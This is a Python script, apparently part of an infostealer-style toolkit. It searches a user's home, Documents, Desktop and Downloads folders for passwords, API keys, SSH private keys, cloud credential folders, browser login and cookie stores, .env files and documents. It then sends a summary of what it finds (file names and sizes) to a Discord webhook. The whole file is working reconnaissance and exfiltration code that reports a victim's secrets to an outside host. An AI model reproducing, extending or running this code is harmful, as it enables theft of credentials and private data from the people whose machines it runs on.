#!/usr/bin/env python3
"""
Sensitive File Finder
Searches for potentially sensitive files (passwords, keys, configs, etc.)
"""

import os
import sys
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, os.path.dirname(__file__))
try:
    from webhook_utils import send_to_discord
    WEBHOOK_AVAILABLE = True
except ImportError:
    WEBHOOK_AVAILABLE = False

# File patterns to search for
SENSITIVE_PATTERNS = [
    # Credentials & Keys
    '*password*', '*passwd*', '*secret*', '*credential*',
    '*api_key*', '*apikey*', '*.pem', '*.key', '*private*',
    '*token*', '*auth*',
    
    # Configuration files
    '*.env', '.env*', 'config.json', 'settings.json',
    '*.conf', '*.config', '.htpasswd',
    
    # SSH & Certificates
    'id_rsa*', 'id_dsa*', '*.ppk', 'known_hosts',
    '*.crt', '*.cer', '*.p12', '*.pfx',
    
    # Database
    '*.db', '*.sqlite', '*.sql',
    
    # Cloud credentials
    'credentials', '.aws/*', '.azure/*', 'gcloud/*',
    
    # Browser data
    '*Login Data*', '*Cookies*', '*History*',
    
    # Documents
    '*.txt', '*.doc', '*.docx', '*.pdf', '*.xlsx'
]

def search_files(root_dir, patterns, max_files=100, max_depth=3):
    """
    Search for files matching patterns
    
    Args:
        root_dir: Directory to start search
        patterns: List of glob patterns
        max_files: Maximum number of files to return
        max_depth: Maximum directory depth
    
    Returns:
        List of found file paths
    """
    found_files = []
    
    try:
        root_path = Path(root_dir).resolve()
        
        for pattern in patterns:
            if len(found_files) >= max_files:
                break
            
            try:
                for file_path in root_path.rglob(pattern):
                    if len(found_files) >= max_files:
                        break
                    
                    # Skip if too deep
                    try:
                        relative = file_path.relative_to(root_path)
                        if len(relative.parts) > max_depth:
                            continue
                    except ValueError:
                        continue
                    
                    # Skip directories and very large files
                    if file_path.is_file():
                        try:
                            size = file_path.stat().st_size
                            if size < 10 * 1024 * 1024:  # < 10MB
                                found_files.append({
                                    'path': str(file_path),
                                    'size': size,
                                    'name': file_path.name
                                })
                        except (OSError, PermissionError):
                            continue
                            
            except (PermissionError, OSError):
                continue
        
        return found_files
        
    except Exception as e:
        print(f"Error during search: {e}")
        return found_files

def main():
    print("=" * 60)
    print("SENSITIVE FILE FINDER")
    print("=" * 60)
    
    # Search common directories
    search_dirs = [
        Path.home(),
        Path.home() / "Documents",
        Path.home() / "Desktop",
        Path.home() / "Downloads",
    ]
    
    all_findings = []
    
    for search_dir in search_dirs:
        if not search_dir.exists():
            continue
        
        print(f"\nSearching: {search_dir}")
        
        findings = search_files(
            search_dir,
            SENSITIVE_PATTERNS,
            max_files=50,
            max_depth=3
        )
        
        all_findings.extend(findings)
        print(f"  Found {len(findings)} files")
    
    print(f"\n{'='*60}")
    print(f"TOTAL FINDINGS: {len(all_findings)} files")
    print(f"{'='*60}\n")
    
    # Display results
    if all_findings:
        print("Sample findings (showing first 20):\n")
        for i, file_info in enumerate(all_findings[:20], 1):
            print(f"{i}. {file_info['name']}")
            print(f"   Path: {file_info['path']}")
            print(f"   Size: {file_info['size'] // 1024} KB")
            print()
        
        if len(all_findings) > 20:
            print(f"... and {len(all_findings) - 20} more files\n")
        
        # Send to Discord
        if WEBHOOK_AVAILABLE:
            print("Sending results to Discord...")
            
            # Format top findings for Discord
            message = f"**Found {len(all_findings)} sensitive files**\n\n"
            
            for file_info in all_findings[:15]:
                message += f"📄 `{file_info['name']}`\n"
                message += f"   └ {file_info['size'] // 1024} KB\n"
            
            if len(all_findings) > 15:
                message += f"\n... and {len(all_findings) - 15} more files"
            
            success = send_to_discord("Sensitive Files Found", message)
            
            if success:
                print("✓ Results sent to Discord")
            else:
                print("✗ Failed to send to Discord")
    else:
        print("No sensitive files found in searched locations.")
    
    print("=" * 60)

if __name__ == "__main__":
    main()
